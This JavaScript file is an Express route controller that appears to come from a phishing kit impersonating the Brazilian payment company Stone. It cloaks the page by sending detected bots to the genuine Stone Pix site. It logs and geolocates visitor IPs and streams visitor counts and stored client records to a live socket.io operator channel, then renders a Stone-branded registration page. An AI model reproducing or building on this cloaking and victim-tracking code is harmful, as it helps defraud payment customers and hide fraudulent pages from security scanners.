const Client = require('../../models/Client')
const isbot = require('isbot')
const Visitor = require('../../models/visitor')
const Robots = require('../../modules/Robots')
const { lookup } = require('geoip-lite')

module.exports = {
    async view(req, res) {
        try {
            isbot.extend(Robots)

            if (isbot(req.get('user-agent'))) return res.redirect('https://www.stone.com.br/pix/')

            const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress

            console.log(lookup(ip))

            const visitor = await Visitor.findOne({ where: { ip } })

            if (!visitor) {
                await Visitor.create({ ip })

                const countVisitors = await Visitor.count()

                req.app.io.emit('visitors', countVisitors)
            }

            const { client } = req.query

            const cliente = await Client.findByPk(client)

            if (client) {
                req.app.io.emit('userReconnect', cliente.toJSON())
                return res.render('stone', { title: 'Stone', pageClasses: 'cadastro', client: cliente.toJSON() })
            }

            return res.render('stone', { title: 'Stone', pageClasses: 'cadastro' })
        } catch (error) {
            console.log(error)
            return res.redirect('/')
        }
    },
}
